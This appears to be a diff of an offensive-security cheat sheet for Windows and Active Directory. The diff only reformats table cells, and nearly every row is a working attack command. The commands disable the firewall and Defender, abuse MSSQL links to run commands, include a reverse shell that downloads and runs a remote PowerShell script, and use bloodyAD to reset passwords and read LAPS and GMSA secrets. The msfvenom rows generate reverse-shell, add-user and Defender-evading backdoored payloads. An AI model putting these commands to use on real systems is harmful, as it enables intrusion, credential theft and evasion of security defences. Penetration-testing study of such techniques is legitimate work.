@@ -77,16 +77,16 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 | Description                                        | Command                                                                               |
 | -------------------------------------------------- | ------------------------------------------------------------------------------------- |
-| Disable firewall - New way                         | `netsh advfirewall set allprofiles state off`                                         |
-| Disable Firewall - Old way                         | `netsh firewall set opmode disable`                                                   |
-| Disable firewall service (can only run as SYSTEM?) | `net stop mpssvc`                                                                     |
-| Current firewall profile                           | `netsh advfirewall show currentprofile`                                               |
-| Firewall rules                                     | `netsh advfirewall firewall show rule name=all`                                       |
-| Show open ports                                    | `netstat -ano`                                                                        |
-| Network Information                                | `ipconfig /all`                                                                       |
-| EXE Exclusion                                      | `Add-MpPreference -ExclusionExtension ".exe"`                                         |
-| Turn off Virus & Threat Detection                  | `Set-MpPreference -DisableRealtimeMonitoring $true`                                   |
-| Remove all definitions                             | `cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all` |
+| Disable firewall - New way                         | netsh advfirewall set allprofiles state off                                         |
+| Disable Firewall - Old way                         | netsh firewall set opmode disable                                                   |
+| Disable firewall service (can only run as SYSTEM?) | net stop mpssvc                                                                     |
+| Current firewall profile                           | netsh advfirewall show currentprofile                                               |
+| Firewall rules                                     | netsh advfirewall firewall show rule name=all                                       |
+| Show open ports                                    | netstat -ano                                                                       |
+| Network Information                                | ipconfig /all                                                                      |
+| EXE Exclusion                                      | Add-MpPreference -ExclusionExtension ".exe"                                         |
+| Turn off Virus & Threat Detection                  | Set-MpPreference -DisableRealtimeMonitoring $true                                   |
+| Remove all definitions                             | cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all |
 
 
 # Useful Basic Commands
@@ -250,19 +250,19 @@ Retrieving password from the linked server:
 
 | Purpose | Command |
 |---------|---------|
-| Get MSSQL Instances in the current domain | `Get-SQLInstanceDomain` |
-| Test for access on the instances | `Get-SQLInstanceDomain \| Get-SQLConnectionTestThreaded -Verbose` |
-| Get INFO about the accessible instances | `Get-SQLInstanceDomain \| Get-SQLServerInfo -Verbose` |
-| Search Database Links | `Get-SQLServerLink -Instance dcorp-mssql -Verbose` |
-| Get nested links using PowerUpSQL | `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose` |
-| Query nested links using OpenQuery | `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')` |
-| Enable xp_cmdshell on remote link | `EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"` |
-| Execute commands using PowerUpSQL | `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" \| ft` |
-| Execute command manually (GUI) | `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')` |
-| Reverse Shell | `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.26/Invoke-PowershellTcp.ps1'')'" \| ft` |
-| Audit for issues | `Invoke-SQLAudit -Verbose` |
-| Escalate to sysadmin | `Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1` |
-| Execute xp_dirtree | `sqlcmd -Q "xp_dirtree '\\\\10.10.14.51\\test'"` |
+| Get MSSQL Instances in the current domain | Get-SQLInstanceDomain |
+| Test for access on the instances | Get-SQLInstanceDomain \| Get-SQLConnectionTestThreaded -Verbose |
+| Get INFO about the accessible instances | Get-SQLInstanceDomain \| Get-SQLServerInfo -Verbose |
+| Search Database Links | Get-SQLServerLink -Instance dcorp-mssql -Verbose |
+| Get nested links using PowerUpSQL | Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose |
+| Query nested links using OpenQuery | select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')') |
+| Enable xp_cmdshell on remote link | EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql" |
+| Execute commands using PowerUpSQL | Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" \| ft |
+| Execute command manually (GUI) | select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')') |
+| Reverse Shell | Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.26/Invoke-PowershellTcp.ps1'')'" \| ft |
+| Audit for issues | Invoke-SQLAudit -Verbose |
+| Escalate to sysadmin | Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1 |
+| Execute xp_dirtree | sqlcmd -Q "xp_dirtree '\\\\10.10.14.51\\test'" |
 
 # NTLM Relay:
 *Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*
@@ -364,16 +364,16 @@ impacket:
 
 | **Purpose**                                           | **Command**                                                                                                                              |
 |-------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
-| Retrieve User Information                             | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username`                                                     |
-| Add User To Group                                     | `bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add`                                      |
-| Change Password                                       | `bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password`                                      |
-| Give User GenericAll Rights                           | `bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username`                                             |
-| WriteOwner                                            | `bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username`                                        |
-| Read GMSA Password                                    | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword`                        |
-| Enable a Disabled Account                             | `bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE`                                  |
-| Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag           | `bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION`                    |
-| Read LAPS Password                                    | `bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime` |
-| Read LAPS Password (Kerberos Auth)                    | `KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime` |
+| Retrieve User Information                             | bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username                                                     |
+| Add User To Group                                     | bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add                                      |
+| Change Password                                       | bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password                                      |
+| Give User GenericAll Rights                           | bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username                                             |
+| WriteOwner                                            | bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username                                        |
+| Read GMSA Password                                    | bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword                        |
+| Enable a Disabled Account                             | bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE                                  |
+| Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag           | bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION                    |
+| Read LAPS Password                                    | bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
+| Read LAPS Password (Kerberos Auth)                    | KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
 
 # MSFVenom Payload Generation Cheetsheet
 
@@ -381,17 +381,17 @@ impacket:
 | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
 | msfvenom DLL 64bit              | msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_64bit.dll                                                                                                                  |
 | msfvenom DLL 32bit              | msfvenom -p windows/reverse_tcp -ax86 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_32bit.dll                                                                                                                            |
-| BASH Reverse shell              | `msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh`                                                                                                                                                      |
-| JSP shell                       | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp`                                                                                                                                                |
-| Linux Reverse Shell             | `msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                               |
-| Windows add user                | `msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe`                                                                                                                                                   |
-| HTA Reverse Shell               | `sudo msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o evil.hta`                                                                                                                                        |
-| Staged Payload for Windows x86  | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe`                                                                                                                                        |
-| Staged Payloads for Windows x64 | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe`                                                                                                                                    |
-| CMDEXEC                         | `msfvenom -p windows/exec CMD="Your Command Here" -f exe -o shell.exe`                                                                                                                                                         |
-| bind shell - x64                | `msfvenom -p windows/x64/shell_bind_tcp LPORT=50001 RHOST=10.11.1.75 --platform windows -a x64 --format raw -o sc_x64_payload.bin`                                                                                             |
-| Linux - x86 reverse shell       | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`                                                                                                                                       |
-| Linux - x64 reverse shell       | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`                                                                                                                                       |
-| Putty.exe WinDef Bypass         | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k` |
-| 64bit Staged Shellcode          | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                                                         |
-| 64bit NonStaged Shellcode       | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`             
+| BASH Reverse shell              | msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh                                                                                                                                                      |
+| JSP shell                       | msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp                                                                                                                                                |
+| Linux Reverse Shell             | msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                               |
+| Windows add user                | msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                                                                   |
+| HTA Reverse Shell               | sudo msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o evil.hta                                                                                                                                        |
+| Staged Payload for Windows x86  | msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe                                                                                                                                        |
+| Staged Payloads for Windows x64 | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe                                                                                                                                    |
+| CMDEXEC                         | msfvenom -p windows/exec CMD="Your Command Here" -f exe -o shell.exe                                                                                                                                                         |
+| bind shell - x64                | msfvenom -p windows/x64/shell_bind_tcp LPORT=50001 RHOST=10.11.1.75 --platform windows -a x64 --format raw -o sc_x64_payload.bin                                                                                             |
+| Linux - x86 reverse shell       | msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf                                                                                                                                       |
+| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf                                                                                                                                       |
+| Putty.exe WinDef Bypass         | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k |
+| 64bit Staged Shellcode          | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c                                                                                                                                         |
+| 64bit NonStaged Shellcode       | msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`             
